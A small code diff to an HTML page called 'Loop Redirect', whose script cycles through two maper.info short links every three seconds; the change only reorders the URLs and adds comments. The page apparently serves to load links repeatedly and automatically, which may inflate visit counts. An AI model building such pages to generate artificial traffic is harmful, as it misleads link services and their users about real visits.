@@ -5,8 +5,8 @@
   <title>Loop Redirect</title>
   <script>
     const links = [
-      "https://maper.info/googlemapaddress",
-      "https://maper.info/RNZFwf"
+      "https://maper.info/RNZFwf",
+      "https://maper.info/googlemapaddress"
     ];
 
     let i = 0;
@@ -16,7 +16,10 @@
       i = (i + 1) % links.length;
     }
 
+    // Change link every 3 seconds
     setInterval(loop, 3000);
+
+    // Start immediately
     loop();
   </script>
 </head>
